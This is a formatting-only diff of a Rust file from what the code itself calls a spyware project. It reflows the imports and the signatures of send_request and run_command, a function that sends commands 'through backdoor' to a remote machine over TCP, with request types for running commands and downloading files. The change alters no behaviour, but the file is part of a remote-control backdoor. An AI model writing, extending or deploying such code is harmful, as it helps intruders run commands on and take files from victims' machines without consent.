@@ -1,5 +1,8 @@
 use serde::Serialize;
-use spyware::communication::messages::{DownloadFileResponse, MessageType, MessageTypes, RunCommandRequest, RunCommandResponse, ErrorInfo};
+use spyware::communication::messages::{
+    DownloadFileResponse, ErrorInfo, MessageType, MessageTypes, RunCommandRequest,
+    RunCommandResponse,
+};
 use std::io::{Error, Write};
 use std::net::TcpStream;
 
@@ -7,7 +10,10 @@ use spyware::communication::messages::DownloadFileRequest;
 use spyware::communication::serialization::serialize_message;
 use spyware::communication::server::get_message;
 
-pub fn send_request(req: impl Serialize + MessageType, stream: &mut TcpStream) -> Result<(), Error> {
+pub fn send_request(
+    req: impl Serialize + MessageType,
+    stream: &mut TcpStream,
+) -> Result<(), Error> {
     let msg = serialize_message(req).unwrap();
 
     println!("Sending buffer {:?}", msg);
@@ -18,7 +24,10 @@ pub fn send_request(req: impl Serialize + MessageType, stream: &mut TcpStream) -
     Ok(())
 }
 
-pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<RunCommandResponse, ErrorInfo> {
+pub fn run_command(
+    command: String,
+    mut stream: &mut TcpStream,
+) -> Result<RunCommandResponse, ErrorInfo> {
     println!("Running command {} through backdoor.", command);
     let req = RunCommandRequest {
         command,
